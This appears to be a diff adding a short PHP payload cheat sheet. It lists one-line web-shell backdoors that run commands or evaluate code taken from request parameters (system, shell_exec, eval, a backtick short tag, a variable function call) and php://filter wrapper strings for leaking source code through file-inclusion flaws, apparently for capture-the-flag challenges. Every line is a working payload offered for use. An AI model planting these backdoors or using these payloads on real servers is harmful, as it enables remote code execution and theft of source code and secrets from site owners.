@@ -1,0 +1,16 @@
+# PHP Vulnerability / Exploit Payloads
+
+# Simple RCE backdoors
+<?php system($_GET['cmd']); ?>
+<?php echo shell_exec($_GET['cmd']); ?>
+<?php eval($_POST['code']); ?>
+
+# Bypass tricks (short open tags)
+<?= `$_GET[cmd]`; ?>
+
+# Obfuscated system execution
+<?php $_GET['func']($_GET['arg']); ?>
+
+# PHP filter extraction (for inclusion challenges)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
